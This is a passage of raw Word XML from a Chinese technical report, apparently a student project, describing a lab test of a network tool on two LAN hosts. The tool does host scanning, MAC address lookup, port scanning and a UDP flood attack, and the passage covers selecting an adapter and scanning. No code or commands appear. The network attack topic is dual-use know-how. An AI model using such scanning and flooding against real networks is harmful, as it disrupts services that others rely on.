    <w:p w14:paraId="1E1C3752" w14:textId="6FF328DE" w:rsidR="002204F5" w:rsidRPr="0034487A" w:rsidRDefault="006A2F15" w:rsidP="006E2249">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>程序运行主机和被攻击主机在同一局域网内，均为Windows系统。程序运行主机IP为192.168.155.1，被攻击主机IP为192.168.155.2。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A23A09" w14:textId="0DEBED0A" w:rsidR="006A2F15" w:rsidRPr="0034487A" w:rsidRDefault="006A2F15" w:rsidP="006E2249">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>被攻击主机在端口8888上运行一个UDP服务用于测试主机扫描，MA</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>地址获取，端口扫描，UDP</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> F</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>lood攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D002F0" w14:textId="6EF9E928" w:rsidR="00150B71" w:rsidRPr="0034487A" w:rsidRDefault="009F06D1" w:rsidP="00593AC4">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1151" w:name="_Toc482141269"/>
      <w:bookmarkStart w:id="1152" w:name="_Toc482141942"/>
      <w:bookmarkStart w:id="1153" w:name="_Toc482522665"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>程序测试</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1151"/>
      <w:bookmarkEnd w:id="1152"/>
      <w:bookmarkEnd w:id="1153"/>
    </w:p>
    <w:p w14:paraId="3D0901A5" w14:textId="467C3018" w:rsidR="009F06D1" w:rsidRPr="0034487A" w:rsidRDefault="002F5BD0" w:rsidP="009F06D1">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1154" w:name="_Toc482141270"/>
      <w:bookmarkStart w:id="1155" w:name="_Toc482141943"/>
      <w:bookmarkStart w:id="1156" w:name="_Toc482522666"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>选择</w:t>
      </w:r>
      <w:r w:rsidR="00BE0DCB" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>网卡</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1154"/>
      <w:bookmarkEnd w:id="1155"/>
      <w:bookmarkEnd w:id="1156"/>
    </w:p>
    <w:p w14:paraId="03C03C1D" w14:textId="76659E7E" w:rsidR="002F5BD0" w:rsidRPr="0034487A" w:rsidRDefault="002F5BD0" w:rsidP="00C35551">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如图</w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示，程序运行主机有两个网卡。本地连接*</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为无线连接，本地连接*</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于构建局域网。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5AD89D" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="002F5BD0" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D94EF55" wp14:editId="5AFE97A1">
            <wp:extent cx="5726042" cy="435102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26452" cy="4351332"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="29FBFD2C" w14:textId="0BBD665A" w:rsidR="002F5BD0" w:rsidRPr="00285EBE" w:rsidRDefault="006C6D3B" w:rsidP="008D0631">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1157" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1158" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1159" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1160" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1161" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1162" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1163" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1164" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>图</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1165" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText xml:space="preserve">5- \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1166" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1167" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
              <w:noProof/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1168" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1169" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="00285EBE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:rPrChange w:id="1170" w:author="李勇" w:date="2017-05-13T21:53:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>程序运行主机网卡使用情况</w:t>
      </w:r>
      <w:ins w:id="1171" w:author="renxt" w:date="2017-05-13T21:03:00Z">
        <w:r w:rsidR="006D52D6" w:rsidRPr="00285EBE">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:rPrChange w:id="1172" w:author="李勇" w:date="2017-05-13T21:53:00Z">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>（字体太小）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5DC9CDCF" w14:textId="263EEC50" w:rsidR="00922AF7" w:rsidRPr="00C35551" w:rsidRDefault="00922AF7" w:rsidP="002F5BD0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56FC8710" w14:textId="06FD3A58" w:rsidR="00922AF7" w:rsidRDefault="00922AF7" w:rsidP="002F5BD0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BB3F6CB" w14:textId="77777777" w:rsidR="00561A2A" w:rsidRPr="0034487A" w:rsidRDefault="00561A2A" w:rsidP="002F5BD0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EA9A5BC" w14:textId="77777777" w:rsidR="00922AF7" w:rsidRPr="0034487A" w:rsidRDefault="00922AF7" w:rsidP="002F5BD0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CBEB473" w14:textId="4C363D11" w:rsidR="00922AF7" w:rsidRPr="0034487A" w:rsidRDefault="002F5BD0" w:rsidP="00561A2A">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>程序扫描出的网卡列表如</w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，选择构建局域网的网卡2用于后面的使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B7B6C8" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="00F050CE" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>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54095A52" w:rsidR="00F050CE" w:rsidRPr="00246280" w:rsidRDefault="006C6D3B" w:rsidP="006C6D3B">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>选择网卡</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1135DC" w14:textId="19351719" w:rsidR="00BE0DCB" w:rsidRPr="0034487A" w:rsidRDefault="00BE0DCB" w:rsidP="00BE0DCB">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1173" w:name="_Toc482141271"/>
      <w:bookmarkStart w:id="1174" w:name="_Toc482141944"/>
      <w:bookmarkStart w:id="1175" w:name="_Toc482522667"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>主机扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1173"/>
      <w:bookmarkEnd w:id="1174"/>
      <w:bookmarkEnd w:id="1175"/>
    </w:p>
    <w:p w14:paraId="22D736F9" w14:textId="3BC0FB69" w:rsidR="00922AF7" w:rsidRPr="0034487A" w:rsidRDefault="002F5BD0" w:rsidP="00246280">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>为被攻击主机网络连接情况。I</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>为192.168.155.2，默认网关为192.168.155.1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0194D783" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="002F5BD0" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>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642DDC5F" w:rsidR="002F5BD0" w:rsidRPr="00246280" w:rsidRDefault="006C6D3B" w:rsidP="006C6D3B">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
